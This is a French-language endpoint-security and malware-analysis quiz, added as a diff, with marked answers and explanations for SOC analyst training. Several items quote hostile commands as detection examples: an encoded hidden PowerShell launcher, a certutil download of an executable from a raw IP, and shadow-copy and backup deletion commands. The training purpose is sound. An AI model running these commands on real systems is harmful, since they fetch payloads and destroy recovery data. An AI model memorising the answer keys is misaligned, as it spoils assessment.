@@ -1,0 +1,161 @@
+# MODULE 6 – ENDPOINT SECURITY AND MALWARE ANALYSIS
+
+## F|Endpoint Security / Ransomware
+Quelle caractéristique définit un ransomware ?
++ Il chiffre ou bloque l'accès aux données et exige une rançon pour leur restitution.
+- Il se limite à afficher des publicités indésirables.
+- Il se propage automatiquement de poste en poste en exploitant des vulnérabilités réseau, sans jamais toucher aux données.
+- Il améliore les performances du système infecté.
+> Le ransomware chiffre les fichiers ou bloque le système (T1486). Les groupes modernes pratiquent la double extorsion : exfiltration des données avant chiffrement, puis menace de publication. Les adwares affichent des publicités et les keyloggers capturent les frappes.
+
+## F|Endpoint Security / Événements Windows
+Quel Event ID Windows indique qu'un journal d'audit de sécurité a été effacé ?
++ 1102.
+- 4624.
+- 4720.
+- 4688.
+> L'Event ID 1102 (« The audit log was cleared ») est généré dans le journal Security. Son effacement est un indicateur classique d'anti-forensic (T1070.001). Les autres IDs correspondent à une ouverture de session réussie (4624), une création de compte (4720) et une création de processus (4688). L'effacement du journal System génère quant à lui l'événement 104.
+
+## F|Endpoint Security / Sysmon
+Quel Event ID Sysmon correspond à la création d'un processus ?
++ 1.
+- 3.
+- 11.
+- 22.
+> Sysmon Event ID 1 (Process Create) fournit l'image, la ligne de commande, le processus parent, l'utilisateur et les hashs. L'ID 3 correspond aux connexions réseau, l'ID 11 à la création de fichiers et l'ID 22 aux requêtes DNS. Sysmon doit être déployé avec une configuration adaptée, comme celles de SwiftOnSecurity ou d'Olaf Hartong.
+
+## F|Endpoint Security / EDR vs antivirus
+Quelle capacité distingue un EDR d'un antivirus traditionnel ?
++ L'enregistrement continu de la télémétrie des terminaux, la détection comportementale et les capacités d'investigation et de réponse à distance.
+- Une base de signatures de fichiers plus volumineuse et mise à jour plusieurs fois par heure, sans collecte de télémétrie comportementale.
+- L'absence totale de console centrale.
+- Le fonctionnement uniquement hors ligne.
+> L'antivirus classique repose principalement sur les signatures. L'EDR (CrowdStrike Falcon, Defender for Endpoint, SentinelOne) collecte en continu processus, fichiers, registre et réseau, détecte des comportements, et permet l'isolation, l'arrêt de processus, la collecte d'artefacts et le threat hunting.
+
+## F|Endpoint Security / XDR
+Qu'apporte une approche XDR par rapport à un EDR seul ?
++ Elle corrèle endpoint, identité, messagerie, réseau et cloud pour une détection et une réponse unifiées.
+- Elle remplace intégralement le besoin de journaux.
+- Elle remplace l'EDR par un pare-feu de nouvelle génération qui analyse le trafic réseau de tous les terminaux et bloque les menaces.
+- Elle supprime l'utilité des analystes SOC.
+> L'XDR (Extended Detection and Response) étend la détection au-delà de l'endpoint. Microsoft Defender XDR, par exemple, relie un e-mail de phishing, le clic de l'utilisateur, l'exécution sur le poste et l'utilisation suspecte du compte dans un même incident.
+
+## F|Endpoint Security / Persistance
+Quelle clé de registre est couramment utilisée par les malwares pour s'exécuter à chaque ouverture de session de l'utilisateur ?
++ HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+- HKLM\SYSTEM\CurrentControlSet\Control\TimeZoneInformation
+- HKCU\Control Panel\Desktop\Wallpaper
+- HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Fonts
+> Les clés Run et RunOnce (dans HKCU et HKLM) lancent des programmes au démarrage de session (T1547.001). Elles sont surveillées par Sysmon (Event ID 13 pour les modifications de valeurs) et par les outils comme Autoruns de Sysinternals.
+
+## I|Endpoint Security / PowerShell encodé
+Un EDR remonte la commande : powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA... Que faut-il en déduire ?
++ Une commande Base64 (UTF-16LE) lancée sans profil et masquée : indicateur fort, à décoder pour analyse.
+- Il s'agit d'une mise à jour Windows standard.
+- La commande est chiffrée en AES avec une clé propre à la machine : elle ne peut pas être décodée et doit être soumise à l'éditeur de l'EDR.
+- Il s'agit d'un script de connexion légitime toujours sans risque.
+> -Enc (EncodedCommand) attend du Base64 encodé en UTF-16LE ; « SQBFAFgA » se décode en « IEX », typique d'un téléchargement et d'une exécution en mémoire. -NoP (NoProfile) et -W Hidden (WindowStyle Hidden) sont souvent associés à l'abus de PowerShell (T1059.001). Le décodage peut être fait avec CyberChef.
+
+## I|Endpoint Security / PowerShell logging
+Quel journal permet de récupérer le contenu réel des scripts PowerShell exécutés, y compris après désobfuscation ?
++ Le Script Block Logging (Event ID 4104, journal PowerShell/Operational).
+- L'Event ID 4624 du journal Security.
+- L'Event ID 4688 du journal Security, qui contient le script complet exécuté.
+- Le journal DNS Server.
+> Le Script Block Logging enregistre les blocs de script au moment de leur exécution, souvent après désobfuscation, ce qui le rend très précieux. Le Module Logging (4103) et la transcription complètent la visibilité. Ces paramètres s'activent par GPO.
+
+## I|Endpoint Security / Process tree
+L'EDR montre l'arbre de processus suivant : WINWORD.EXE → cmd.exe → powershell.exe → connexion réseau externe. Quelle est l'interprétation la plus probable ?
++ Une macro malveillante d'un document Office a lancé un interpréteur de commandes pour télécharger une charge utile.
+- Word vérifie la disponibilité d'une mise à jour orthographique.
+- Word a lancé son assistant de mise à jour, qui utilise cmd.exe et PowerShell pour télécharger les correctifs Office depuis le CDN Microsoft.
+- Il s'agit du comportement normal de l'impression d'un document.
+> Une application Office n'a normalement pas à lancer cmd.exe ou powershell.exe. Cette relation parent-enfant anormale est un indicateur classique de phishing avec pièce jointe (T1566.001) et d'exécution par l'utilisateur (T1204.002). Les règles ASR de Defender peuvent bloquer la création de processus enfants par Office.
+
+## I|Endpoint Security / DLL sideloading
+Un exécutable légitime et signé d'un éditeur connu est retrouvé dans C:\Users\Public\ avec une DLL non signée portant le nom d'une dépendance attendue. Quelle technique est probablement utilisée ?
++ Le DLL side-loading : un binaire légitime charge une DLL malveillante placée à côté de lui.
+- Le Kerberoasting.
+- Le process hollowing, qui remplace en mémoire le code du binaire légitime par celui de la DLL.
+- Le password spraying.
+> Le DLL side-loading (T1574.002) consiste à placer un exécutable légitime à côté d'une DLL malveillante qu'il chargera. Cela permet de bénéficier de la réputation du binaire signé. Sysmon Event ID 7 (Image Loaded) permet de détecter le chargement de DLL non signées depuis des chemins inhabituels.
+
+## I|Endpoint Security / Process injection
+Sysmon enregistre un Event ID 8 (CreateRemoteThread) où un processus inconnu crée un thread dans explorer.exe. Quelle technique est suspectée ?
++ L'injection de processus (process injection) pour exécuter du code dans le contexte d'un processus légitime.
+- Une élévation de privilèges par création d'un compte administrateur local caché depuis explorer.exe.
+- L'effacement des journaux de sécurité.
+- Une requête DNS vers un domaine légitime.
+> La création d'un thread distant est une méthode classique d'injection (T1055). Le code malveillant s'exécute alors sous l'identité d'un processus de confiance, ce qui complique la détection. L'analyse mémoire (malfind) et la télémétrie EDR permettent de confirmer l'injection.
+
+## I|Endpoint Security / LOLBins
+Un analyste observe la commande certutil.exe -urlcache -split -f http://198.51.100.7/a.txt C:\ProgramData\a.exe. Quelle conclusion tirer ?
++ Un binaire Windows légitime (LOLBin) est détourné pour télécharger une charge utile depuis Internet.
+- Il s'agit d'une mise à jour légitime de la liste de révocation des certificats (CRL), certutil stockant le résultat dans ProgramData.
+- La commande vérifie l'intégrité d'un certificat TLS.
+- C'est une sauvegarde automatique de l'utilisateur.
+> Certutil est conçu pour gérer les certificats, mais son option -urlcache permet de télécharger des fichiers (T1105 – Ingress Tool Transfer). Les « Living off the Land Binaries » (référencés sur le projet LOLBAS) permettent d'éviter de déposer des outils suspects. La présence d'une IP brute et d'un .exe dans ProgramData renforce la suspicion.
+
+## I|Endpoint Security / Services
+Quel Event ID du journal System Windows signale l'installation d'un nouveau service, souvent utilisée pour la persistance ou l'exécution à distance ?
++ 7045.
+- 4740.
+- 4771.
+- 5156.
+> L'Event ID 7045 (« A service was installed in the system ») est un indicateur important : PsExec, certains outils de pentest et des malwares créent des services. L'équivalent dans le journal Security est 4697 lorsque l'audit est activé. 4740 correspond à un verrouillage de compte, 4771 à un échec de pré-authentification Kerberos et 5156 à une connexion autorisée par le pare-feu Windows.
+
+## I|Malware Analysis / Analyse statique
+Quelle activité relève de l'analyse statique d'un malware ?
++ Calculer ses hashs, extraire les chaînes de caractères et examiner les imports et l'en-tête PE sans l'exécuter.
+- Exécuter l'échantillon dans une sandbox isolée et observer ses connexions réseau, ses processus enfants et ses modifications du registre.
+- Surveiller les modifications du registre pendant son exécution.
+- Capturer le trafic C2 généré par l'échantillon.
+> L'analyse statique examine le fichier sans l'exécuter : hashs, strings, imports (ex. VirtualAlloc, CreateRemoteThread), sections, entropie (packing), règles YARA. L'analyse dynamique exécute l'échantillon dans un environnement isolé pour observer son comportement.
+
+## I|Endpoint Security / CrowdStrike
+Dans CrowdStrike Falcon, quelle fonctionnalité permet à un analyste d'exécuter des commandes sur un hôte à distance pour collecter des fichiers ou tuer un processus ?
++ Real Time Response (RTR).
+- Falcon Spotlight.
+- Falcon Discover.
+- Falcon Fusion (workflows SOAR).
+> Real Time Response fournit un shell distant sécurisé sur l'hôte (commandes ls, get, kill, reg query, ainsi que des scripts selon les droits). Spotlight concerne la gestion des vulnérabilités et Discover l'inventaire des actifs et applications.
+
+## A|Endpoint Security / Évasion EDR
+Un attaquant a chargé un driver vulnérable signé pour désactiver le capteur EDR (technique BYOVD). Quel signal le SOC doit-il surveiller en priorité ?
++ La perte de télémétrie d'un capteur EDR et le chargement de nouveaux drivers (Sysmon 6, 7045 kernel).
+- L'augmentation des connexions RDP réussies et des échecs d'authentification sur le poste, qui précèdent systématiquement le chargement d'un driver.
+- La modification du fond d'écran des utilisateurs.
+- Le taux d'utilisation du processeur du SIEM.
+> Le « Bring Your Own Vulnerable Driver » (T1068, T1562.001) exploite des drivers signés mais vulnérables pour tuer les processus de sécurité depuis le noyau. La surveillance de l'état des capteurs et du chargement de drivers, et l'application de la liste de blocage des drivers vulnérables de Microsoft, sont des contre-mesures clés.
+
+## A|Endpoint Security / AMSI
+Le Script Block Logging révèle une commande PowerShell modifiant en mémoire la valeur « amsiInitFailed ». Quel est l'objectif de l'attaquant ?
++ Contourner l'AMSI (Antimalware Scan Interface) afin que les scripts malveillants suivants ne soient plus analysés par l'antivirus.
+- Activer la journalisation avancée de PowerShell (transcription et Script Block Logging) pour faciliter le débogage de ses scripts.
+- Mettre à jour le moteur de l'antivirus.
+- Chiffrer les fichiers de l'utilisateur.
+> L'AMSI permet aux moteurs antimalware d'inspecter les scripts au moment de leur exécution. Forcer amsiInitFailed à vrai désactive cette inspection dans la session (T1562.001 – Impair Defenses). Sa détection dans les événements 4104 est un indicateur à haute fidélité.
+
+## A|Endpoint Security / WMI persistence
+Sysmon enregistre des Event IDs 19, 20 et 21 sur un serveur. Quelle technique de persistance est en cause ?
++ Un abonnement aux événements WMI (filtre, consommateur et liaison) permettant d'exécuter du code lors d'un événement déclencheur.
+- Une tâche planifiée créée via schtasks.exe, dont les étapes de création, de modification et d'exécution sont journalisées par Sysmon.
+- Une clé de registre Run modifiée.
+- Un service Windows installé via sc.exe.
+> Les Event IDs Sysmon 19 (WmiEventFilter), 20 (WmiEventConsumer) et 21 (WmiEventConsumerToFilter) tracent la création d'abonnements WMI permanents (T1546.003). Cette persistance sans fichier est discrète et fréquemment utilisée par des acteurs avancés.
+
+## A|Malware Analysis / Packing
+Un exécutable présente une section .text à entropie de 7,9, très peu d'imports (LoadLibraryA, GetProcAddress) et des chaînes illisibles. Quelle conclusion est la plus probable ?
++ L'exécutable est probablement packé ou chiffré, et ses fonctionnalités réelles seront résolues dynamiquement à l'exécution.
+- L'exécutable est un fichier texte renommé.
+- Le fichier est un exécutable .NET légitime : l'entropie élevée et le faible nombre d'imports sont normaux pour du code managé compilé à la volée.
+- Il s'agit nécessairement d'un pilote Windows signé.
+> Une entropie proche de 8 indique des données compressées ou chiffrées. Un nombre minimal d'imports, limité au chargement dynamique d'API, est caractéristique des packers (UPX, packers personnalisés). L'analyse dynamique en sandbox ou le dépaquetage est nécessaire pour révéler le comportement.
+
+## A|Endpoint Security / Détection de comportement
+Lequel de ces comportements est le plus spécifique d'une activité de ransomware pré-chiffrement ?
++ vssadmin, wbadmin delete catalog et bcdedit recoveryenabled no, puis l'arrêt des services de sauvegarde.
+- Une ouverture de session interactive le matin.
+- L'installation d'une mise à jour de navigateur.
+- Une augmentation du trafic DNS vers les serveurs Microsoft, suivie du téléchargement de mises à jour cumulatives et d'un redémarrage planifié.
+> Les ransomwares désactivent les mécanismes de récupération (T1490) et arrêtent les services (T1489) pour libérer les fichiers verrouillés avant chiffrement. Une règle combinant ces commandes offre une détection précoce à haute fidélité permettant d'isoler l'hôte avant le chiffrement massif.
